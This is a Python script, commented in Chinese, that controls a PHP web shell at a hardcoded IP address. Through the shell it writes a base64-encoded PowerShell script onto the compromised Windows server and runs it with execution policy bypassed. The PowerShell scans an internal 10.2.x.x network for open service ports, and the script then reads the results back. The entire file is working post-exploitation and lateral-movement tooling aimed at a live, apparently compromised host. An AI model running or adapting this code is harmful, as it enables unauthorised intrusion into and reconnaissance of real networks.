#!/usr/bin/env python3
"""简化版 PowerShell 扫描: 单行命令, 无复杂语法"""
import urllib.request, urllib.parse, time, base64

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=90):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

# 极简 PS 脚本 (UTF-8 无BOM, 用分号单行避免花括号错误)
ps = b'''$ports=80,443,3306,3389,22,445,6379,8080,9096
$out="C:/phpScan/lat_ps.txt"
Remove-Item $out -ErrorAction SilentlyContinue
$ips=@()
for($b=0;$b -le 3;$b++){for($i=1;$i -le 254;$i++){$ips+="10.2.$b.$i"}}
foreach($ip in $ips){
 if($ip -eq "10.2.0.4"){continue}
 foreach($p in $ports){
  $c=New-Object System.Net.Sockets.TcpClient
  $r=$c.BeginConnect($ip,$p,$null,$null)
  $ok=$r.AsyncWaitHandle.WaitOne(250)
  if($ok -and $c.Connected){Add-Content $out "$ip`:$p"}
  $c.Close()
 }
}
Add-Content $out "#PS_DONE"
'''
b64 = base64.b64encode(ps).decode()  # 直接 UTF-8 字节

# 用 php 写文件 (原始字节)
code = f"system('C:/phpStudy/php/php-5.4.45/php.exe -r \"file_put_contents(\\\"C:/phpScan/lat2.ps1\\\", base64_decode(\\\"{b64}\\\"));\" 2>&1');print_r('W:' . filesize('C:/phpScan/lat2.ps1'));"
r = cmd(code, 30)
print("1. 写ps1:", r.strip()[-60:], flush=True)

code2 = "pclose(popen('start /b cmd /c \"powershell -NoProfile -ExecutionPolicy Bypass -File C:/phpScan/lat2.ps1 > C:/phpScan/lat2.log 2>&1\"', 'r'));print_r('STARTED');"
r = cmd(code2, 25)
print("2. 启动:", r.strip()[-40:], flush=True)
time.sleep(20)
r = cmd("print_r(file_get_contents('C:/phpScan/lat2.log'));", 20)
print("3. log:", r.strip()[-200:], flush=True)
r = cmd("print_r(file_get_contents('C:/phpScan/lat_ps.txt'));", 20)
print("4. 结果:", r.strip()[-400:], flush=True)
